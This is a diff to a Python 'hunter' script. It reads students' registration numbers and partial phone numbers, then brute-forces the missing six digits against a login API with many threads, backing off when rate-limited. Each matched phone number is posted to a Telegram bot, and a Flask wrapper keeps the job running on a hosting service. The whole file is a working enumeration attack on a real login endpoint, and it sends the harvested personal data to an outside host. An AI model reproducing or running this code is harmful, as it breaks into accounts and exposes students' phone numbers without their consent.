@@ -2,6 +2,7 @@ import requests
 import time
 import os
 import threading
+import traceback
 from concurrent.futures import ThreadPoolExecutor
 from flask import Flask
 
@@ -30,9 +31,11 @@ def send_telegram_msg(text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": CHAT_ID, "text": text}
     try:
-        requests.post(url, json=payload)
+        res = requests.post(url, json=payload)
+        if res.status_code != 200:
+            print(f"Telegram Error: {res.text}")
     except Exception as e:
-        print("Telegram error:", e)
+        print("Telegram Exception:", e)
 
 def check_number(reg_no, last4, prefix6):
     phone = prefix6 + last4
@@ -43,24 +46,19 @@ def check_number(reg_no, last4, prefix6):
     
     try:
         r = requests.post(API_URL, json=payload, headers=HEADERS, timeout=10)
-        
-        # Agar login successful (Sahi number mil gaya)
         if r.status_code == 200:
-            return phone # Phone number return kar do
-            
+            return phone
         elif r.status_code == 401:
-            return False # Galat number
-            
-        elif r.status_code == 429:
-            time.sleep(2) # Rate limit
             return False
-            
+        elif r.status_code == 429:
+            time.sleep(2)
+            return False
     except Exception:
         pass
     return False
 
 def process_student(index, reg_no, last4):
-    print(f"\n[{index}] Searching number ending with {last4} for Reg: {reg_no}...")
+    print(f"\n[{index}] Searching number ending with {last4} for Reg: {reg_no}...", flush=True)
     
     valid_first_digits = ['6', '7', '8', '9']
     prefixes = [f"{first_digit}{i:05d}" for first_digit in valid_first_digits for i in range(100000)]
@@ -73,32 +71,29 @@ def process_student(index, reg_no, last4):
             result = future.result()
             if result:
                 found_phone = result
-                break # Number mil gaya, loop se bahar aao
+                break
     
-    # Ab result ke hisaab se Telegram pe message bhejo
     if found_phone:
         msg = f"[{index}] {reg_no}    {found_phone}  sus"
-        print(msg)
+        print(msg, flush=True)
         send_telegram_msg(msg)
-        with open("result.txt", "a", encoding="utf-8") as f:
-            f.write(f"[{index}] {reg_no}    {found_phone}  sus\n")
     else:
         msg = f"[{index}] {reg_no}    no match number found"
-        print(msg)
+        print(msg, flush=True)
         send_telegram_msg(msg)
-        with open("result.txt", "a", encoding="utf-8") as f:
-            f.write(f"[{index}] {reg_no}    no match number found\n")
             
-    # Agle student ke liye message
     send_telegram_msg("--------------------------------\nNext target scan ho raha hai...")
 
 def run_hunter():
-    time.sleep(5) 
+    time.sleep(5)
     try:
+        # Render me path dhundhne ke liye check
+        print(f"Looking for file at: {os.path.abspath(FILE_NAME)}", flush=True)
+        
         with open(FILE_NAME, 'r', encoding='utf-8') as f:
             lines = [line.strip() for line in f.readlines() if line.strip()]
             
-        print(f"Total {len(lines)} lines mili. Kaam shuru...")
+        print(f"Total {len(lines)} lines mili. Kaam shuru...", flush=True)
         send_telegram_msg(f"🚀 Script start ho gayi! Total {len(lines)} students process honge.")
         
         for i, line in enumerate(lines, start=1):
@@ -110,9 +105,10 @@ def run_hunter():
                 
         send_telegram_msg("✅ Saare students process ho gaye! File check kar le.")
                 
-    except FileNotFoundError:
-        print("File nahi mili.")
-        send_telegram_msg("❌ Error: students.txt file nahi mili!")
+    except Exception as e:
+        print("Error in run_hunter:", e, flush=True)
+        traceback.print_exc()
+        send_telegram_msg(f"❌ Error aaya: {str(e)}")
 
 @app.route('/')
 def home():
